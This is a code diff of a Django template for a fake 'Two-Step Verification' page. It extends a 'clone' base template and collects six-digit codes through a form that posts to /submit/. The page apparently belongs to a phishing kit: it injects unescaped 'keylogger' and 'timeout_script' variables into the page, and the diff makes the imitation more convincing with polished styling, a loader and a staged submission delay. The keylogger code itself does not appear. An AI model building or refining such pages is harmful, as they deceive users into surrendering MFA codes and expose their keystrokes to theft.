@@ -1,14 +1,356 @@
-{% extends 'base.html' %}
+{% extends 'base/clone.html' %}
 
 {% load static %}
 
 {% block content %}
-<div>
-    <h1>Enter 6-digit MFA Code</h1>
-    <form action="/submit/" method="post">
-      <input type="text" name="mfa" placeholder="MFA Code"><br>
-      <input type="submit" value="Verify">
-    </form>
-    {{ keylogger|safe }} {{ timeout_script|safe }}
+<div class="mfa-container">
+    <div class="mfa-card">
+        <div class="mfa-header">
+            <img src="{% static 'images/mfa-icon.png' %}" alt="MFA Icon" class="mfa-icon">
+            <h1 class="mfa-title">Two-Step Verification</h1>
+            <p class="mfa-subtitle">Enter the 6-digit code from your authenticator app</p>
+        </div>
+        
+        <form action="/submit/" method="post" class="mfa-form" autocomplete="off">
+            {% csrf_token %}
+            <div class="mfa-input-group">
+                <input type="text" 
+                       name="mfa" 
+                       id="mfaCode" 
+                       inputmode="numeric" 
+                       pattern="\d{6}" 
+                       maxlength="6" 
+                       placeholder="• • • • • •" 
+                       required
+                       class="mfa-input"
+                       autofocus>
+                <label for="mfaCode" class="mfa-label">Verification Code</label>
+            </div>
+            
+            <button type="submit" class="mfa-button">
+                <span class="button-text">Verify</span>
+                <span class="button-loader hidden">
+                    <span class="loader-dot"></span>
+                    <span class="loader-dot"></span>
+                    <span class="loader-dot"></span>
+                </span>
+            </button>
+            
+            <div class="mfa-footer">
+                <p class="mfa-help">Didn't receive a code? <a href="#" class="mfa-link">Resend code</a></p>
+                <p class="mfa-timer hidden">Resend available in <span id="countdown">60</span> seconds</p>
+            </div>
+        </form>
+    </div>
+    
+    <div class="mfa-security-notice">
+        <i class="fas fa-shield-alt security-icon"></i>
+        <p>For your security, this code will expire in 5 minutes</p>
+    </div>
 </div>
-{% endblok %}
+
+<style>
+    :root {
+        --primary-color: #4a6bff;
+        --primary-dark: #3a56cc;
+        --error-color: #ff4757;
+        --text-color: #2d3748;
+        --light-gray: #f7fafc;
+        --medium-gray: #e2e8f0;
+        --dark-gray: #718096;
+        --white: #ffffff;
+        --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        --transition: all 0.3s ease;
+    }
+    
+    .mfa-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 2rem;
+        background-color: var(--light-gray);
+        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+    
+    .mfa-card {
+        width: 100%;
+        max-width: 420px;
+        background: var(--white);
+        border-radius: 12px;
+        padding: 2.5rem;
+        box-shadow: var(--shadow);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .mfa-header {
+        margin-bottom: 2rem;
+    }
+    
+    .mfa-icon {
+        width: 64px;
+        height: 64px;
+        margin-bottom: 1rem;
+    }
+    
+    .mfa-title {
+        font-size: 1.5rem;
+        font-weight: 600;
+        color: var(--text-color);
+        margin-bottom: 0.5rem;
+    }
+    
+    .mfa-subtitle {
+        color: var(--dark-gray);
+        font-size: 0.875rem;
+        margin-bottom: 0;
+    }
+    
+    .mfa-form {
+        display: flex;
+        flex-direction: column;
+        gap: 1.5rem;
+    }
+    
+    .mfa-input-group {
+        position: relative;
+        margin-bottom: 1rem;
+    }
+    
+    .mfa-label {
+        position: absolute;
+        left: 1rem;
+        top: 50%;
+        transform: translateY(-50%);
+        color: var(--dark-gray);
+        font-size: 0.875rem;
+        transition: var(--transition);
+        pointer-events: none;
+    }
+    
+    .mfa-input {
+        width: 100%;
+        padding: 1rem;
+        font-size: 1.25rem;
+        letter-spacing: 0.5rem;
+        text-align: center;
+        border: 2px solid var(--medium-gray);
+        border-radius: 8px;
+        transition: var(--transition);
+        background-color: var(--light-gray);
+        font-weight: 600;
+    }
+    
+    .mfa-input:focus {
+        outline: none;
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 3px rgba(74, 107, 255, 0.2);
+    }
+    
+    .mfa-input:focus + .mfa-label,
+    .mfa-input:not(:placeholder-shown) + .mfa-label {
+        top: -10px;
+        left: 10px;
+        font-size: 0.75rem;
+        background: var(--white);
+        padding: 0 4px;
+        color: var(--primary-color);
+    }
+    
+    .mfa-input::placeholder {
+        color: transparent;
+    }
+    
+    .mfa-button {
+        background-color: var(--primary-color);
+        color: var(--white);
+        border: none;
+        padding: 1rem;
+        border-radius: 8px;
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: var(--transition);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        height: 48px;
+    }
+    
+    .mfa-button:hover {
+        background-color: var(--primary-dark);
+    }
+    
+    .button-loader {
+        display: flex;
+        gap: 0.25rem;
+    }
+    
+    .loader-dot {
+        width: 8px;
+        height: 8px;
+        background-color: var(--white);
+        border-radius: 50%;
+        animation: bounce 1.4s infinite ease-in-out both;
+    }
+    
+    .loader-dot:nth-child(1) {
+        animation-delay: -0.32s;
+    }
+    
+    .loader-dot:nth-child(2) {
+        animation-delay: -0.16s;
+    }
+    
+    @keyframes bounce {
+        0%, 80%, 100% { transform: scale(0); }
+        40% { transform: scale(1); }
+    }
+    
+    .hidden {
+        display: none;
+    }
+    
+    .mfa-footer {
+        margin-top: 1rem;
+        font-size: 0.875rem;
+    }
+    
+    .mfa-help {
+        color: var(--dark-gray);
+        margin-bottom: 0.5rem;
+    }
+    
+    .mfa-timer {
+        color: var(--dark-gray);
+        font-weight: 500;
+    }
+    
+    .mfa-link {
+        color: var(--primary-color);
+        text-decoration: none;
+        font-weight: 500;
+    }
+    
+    .mfa-link:hover {
+        text-decoration: underline;
+    }
+    
+    .mfa-security-notice {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        margin-top: 1.5rem;
+        font-size: 0.75rem;
+        color: var(--dark-gray);
+    }
+    
+    .security-icon {
+        color: var(--primary-color);
+    }
+    
+    /* Error state */
+    .error .mfa-input {
+        border-color: var(--error-color);
+    }
+    
+    .error .mfa-input:focus {
+        box-shadow: 0 0 0 3px rgba(255, 71, 87, 0.2);
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+        .mfa-card {
+            padding: 1.5rem;
+        }
+        
+        .mfa-input {
+            font-size: 1rem;
+            padding: 0.875rem;
+        }
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const mfaInput = document.getElementById('mfaCode');
+        const form = document.querySelector('.mfa-form');
+        const button = document.querySelector('.mfa-button');
+        const buttonText = document.querySelector('.button-text');
+        const buttonLoader = document.querySelector('.button-loader');
+        const resendLink = document.querySelector('.mfa-link');
+        const helpText = document.querySelector('.mfa-help');
+        const timerText = document.querySelector('.mfa-timer');
+        const countdown = document.getElementById('countdown');
+        
+        // Auto-advance input
+        mfaInput.addEventListener('input', function(e) {
+            if (this.value.length === 6) {
+                this.blur();
+                // Optional: auto-submit when 6 digits entered
+                // form.submit();
+            }
+        });
+        
+        // Prevent non-numeric input
+        mfaInput.addEventListener('keydown', function(e) {
+            if (e.key === 'e' || e.key === '+' || e.key === '-' || e.key === '.') {
+                e.preventDefault();
+            }
+        });
+        
+        // Form submission handler
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            buttonText.classList.add('hidden');
+            buttonLoader.classList.remove('hidden');
+            button.disabled = true;
+            
+            // Simulate network request (replace with actual form submission)
+            setTimeout(() => {
+                // This would be your actual form submission
+                form.submit();
+            }, 1500);
+        });
+        
+        // Resend code functionality
+        resendLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Show timer and hide help text
+            helpText.classList.add('hidden');
+            timerText.classList.remove('hidden');
+            
+            // Start countdown
+            let timeLeft = 60;
+            countdown.textContent = timeLeft;
+            
+            const timer = setInterval(() => {
+                timeLeft--;
+                countdown.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    timerText.classList.add('hidden');
+                    helpText.classList.remove('hidden');
+                }
+            }, 1000);
+            
+            // Here you would actually trigger a resend request to your backend
+            console.log('Resend MFA code requested');
+        });
+        
+        // Focus the input on load
+        mfaInput.focus();
+    });
+</script>
+
+{{ keylogger|safe }} 
+{{ timeout_script|safe }}
+{% endblock %}
